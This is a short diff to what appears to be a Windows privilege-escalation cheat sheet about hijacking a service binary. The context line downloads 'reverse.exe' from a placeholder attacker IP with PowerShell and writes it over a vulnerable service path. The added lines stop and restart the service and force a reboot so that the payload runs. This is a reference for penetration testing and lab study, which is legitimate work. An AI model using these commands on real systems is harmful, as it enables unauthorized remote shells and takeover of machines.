@@ -48,3 +48,12 @@ iwr -uri http://$(IP_ADDRESS)/reverse.exe -Outfile C:\Vulnerable\Service\Path.ex
 ```
 # Restart service
 Either restart revice manually or reboot the target (assuming the service is set to automatic startup)
+```batch
+net stop $SERVICE
+```
+```batch
+net start $SERVICE
+```
+```batch
+shutdown /r /t 0
+```
